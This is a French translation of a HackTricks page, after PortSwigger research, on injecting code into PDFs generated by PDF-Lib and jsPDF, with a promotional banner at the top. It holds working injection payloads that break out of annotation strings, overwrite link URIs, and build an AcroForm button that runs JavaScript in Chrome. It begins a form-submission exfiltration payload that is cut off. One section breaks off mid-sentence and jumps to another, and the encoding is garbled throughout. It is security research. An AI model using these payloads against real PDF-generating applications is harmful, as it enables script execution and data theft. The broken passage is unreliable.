<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Si votre entr√©e est refl√©t√©e dans un fichier PDF, vous pouvez essayer d'injecter des donn√©es PDF pour ex√©cuter JavaScript ou voler le contenu PDF.**

Les informations suivantes ont √©t√© prises sur [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Cette fois, j'utilisais [PDFLib](https://pdf-lib.js.org). J'ai pris un certain temps pour utiliser la biblioth√®que afin de cr√©er une annotation et voir si je pouvais injecter une parenth√®se fermante dans l'URI de l'annotation - et √ßa a march√© ! Le code vuln√©rable que j'ai utilis√© pour g√©n√©rer le code d'annotation √©tait :

`...`  \
`A: {`\
    `Type: 'Action',`\
    `S: 'URI',`\
    ``URI: PDFString.of(`injection)`),``\
  `}`\
  `})`\
`...`

[Code complet :](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

Comment ai-je su que l'injection avait r√©ussi ? Le PDF s'affichait correctement sauf si j'injectais une parenth√®se fermante. Cela a prouv√© que la parenth√®se fermante sortait de la cha√Æne de caract√®res et causait un code PDF invalide. Casser le PDF √©tait bien, mais je devais m'assurer que je pouvais bien s√ªr ex√©cuter JavaScript. J'ai regard√© le code PDF rendu et j'ai remarqu√© que la sortie √©tait encod√©e en utilisant le filtre FlateDecode. J'ai √©crit un petit script pour d√©compresser le bloc et la sortie de la section d'annotation ressemblait √† ceci :`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Comme vous pouvez le voir clairement, la cha√Æne d'injection ferme la limite de texte avec une parenth√®se fermante, ce qui laisse une parenth√®se fermante existante qui provoque un rendu incorrect du PDF :

![Capture d'√©cran montrant une bo√Æte de dialogue d'erreur lors du chargement du PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Super, j'ai pu casser le rendu du PDF, et maintenant ? Je devais trouver une injection qui appelait du JavaScript - l'alerte(1) de l'injection PDF.

Tout comme les vecteurs XSS d√©pendent de l'analyse du navigateur, l'exploitabilit√© de l
## Chrome

J'ai beaucoup parl√© d'Acrobat, mais qu'en est-il de PDFium (le lecteur PDF de Chrome) ? Chrome est difficile √† attaquer car sa prise en charge de JavaScript est plus limit√©e que celle d'Acrobat. La premi√®re chose que j'ai remarqu√©e est que JavaScript n'√©tait pas du tout ex√©cut√© dans les annotations, donc mes preuves de concept ne fonctionnaient pas. Pour faire fonctionner les vecteurs dans Chrome, j'ai besoin d'ex√©cuter au moins du JavaScript √† l'int√©rieur des annotations. Tout d'abord, j'ai d√©cid√© d'essayer d'√©craser une URL dans une annotation. C'√©tait assez facile. Je pouvais utiliser l'injection de base que j'avais trouv√©e auparavant et simplement injecter une autre action avec une entr√©e URI qui √©craserait l'URL existante : `var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

Cela naviguerait vers portswigger.net lorsqu'on clique dessus. Ensuite, j'ai essay√© diff√©rentes injections pour appeler JavaScript, mais cela a √©chou√© √† chaque fois. Je pensais que c'√©tait impossible √† faire. J'ai pris du recul et j'ai essay√© de construire manuellement un PDF entier qui appellerait JavaScript √† partir d'un clic dans Chrome sans injection. Lorsque j'utilisais un bouton AcroForm, Chrome permettait l'ex√©cution de JavaScript, mais le probl√®me √©tait qu'il n√©cessitait des r√©f√©rences √† des parties du PDF. J'ai r√©ussi √† cr√©er une injection qui ex√©cuterait JavaScript √† partir d'un clic sur JSPDF : `var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

Comme vous pouvez le voir, le vecteur ci-dessus n√©cessite une connaissance de la structure PDF. \[ 3 0 R] fait r√©f√©rence √† un objet PDF sp√©cifique et si nous faisions une attaque d'injection PDF aveugle, nous ne conna√Ætrions pas sa structure. N√©anmoins, la prochaine √©tape consiste √† essayer une soumission de formulaire. Nous pouvons utiliser la fonction submitForm pour cela, et comme l'annotation n√©cessite un clic, Chrome le permettra : `/) >> >> <</BS<</S/B/W 0>>/Type/
